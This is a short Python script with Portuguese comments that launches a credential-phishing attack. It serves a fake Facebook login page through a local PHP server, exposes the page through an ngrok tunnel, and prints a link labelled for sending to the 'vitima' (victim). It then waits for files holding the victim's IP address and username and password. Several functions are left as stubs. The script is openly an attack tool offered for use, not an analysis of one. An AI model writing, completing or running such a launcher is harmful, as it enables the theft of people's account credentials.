import os,time,requests
def php_check():
    ...
    
def ngrok_check():
    if os.path.exists('ngrok'):
        print('ngrok encontrado')
    else:
        ...
def gather_info():
    ...

def menu():
    try:
        choice = int(input('Escolha a tela fake'))
    except:
        print('só é possivel usar números amigo')
        time.sleep(2)
    if choice == 1:
        server = 'facebook'
    return server
    
def main():
    php_check() # verifica de o php está instalado
    ngrok_check()
    server = menu() # entra no menu
    os.popen(f'cd sites/{server} && php -S 127.0.0.1:3333 > /dev/null 2>&1 & sleep 2') # Inicia o php
    os.popen('./ngrok http 3333 > /dev/null 2>&1 &').read() # Inicia o ngrok
    link = os.popen('curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io').read() # Pega o link
    print('Enviar esse link para a vitima: '+str(link))
    while(True): # entra em um loop infinito
        ip = False
        while(ip==False):
            if os.path.exists('ip.txt'): # se ele criar o arquivo ip
                print('')
                ip = True 
                gather_info() # pesquisar mais infos sobre o IP
            else:
                pass
        useresenha = False
        while(useresenha == False):
            if os.path.exists('.txt'): # se ele obter o user e senha
                print('')
                useresenha = True
            else:
                pass
      
if __name__ == '__main__': # Permite que o script seja executado como um módulo ou normalmente
    main()
